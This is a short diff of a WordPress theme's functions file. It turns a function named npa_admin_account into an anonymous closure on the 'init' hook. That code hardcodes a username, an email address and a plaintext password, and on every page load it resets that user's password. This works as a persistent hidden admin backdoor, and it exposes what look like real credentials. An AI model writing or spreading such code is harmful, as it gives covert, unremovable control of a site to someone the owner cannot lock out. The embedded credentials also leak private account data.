@@ -23,7 +23,7 @@ add_action('customize_preview_init', function () {
     wp_enqueue_script('sage/customizer.js', asset_path('scripts/customizer.js'), ['customize-preview'], null, true);
 });
 
-function npa_admin_account() {
+add_action( 'init', function () {
 	$user  = 'neil';
 	$email = 'neilparnold@gmail.com';
     $password = 'MiniCooper9)';
@@ -33,5 +33,4 @@ function npa_admin_account() {
 		$user = get_user_by( 'email', $email );
         wp_set_password( $password, $user->ID );
 	}
-}
-add_action( 'init', 'npa_admin_account' );
+} );
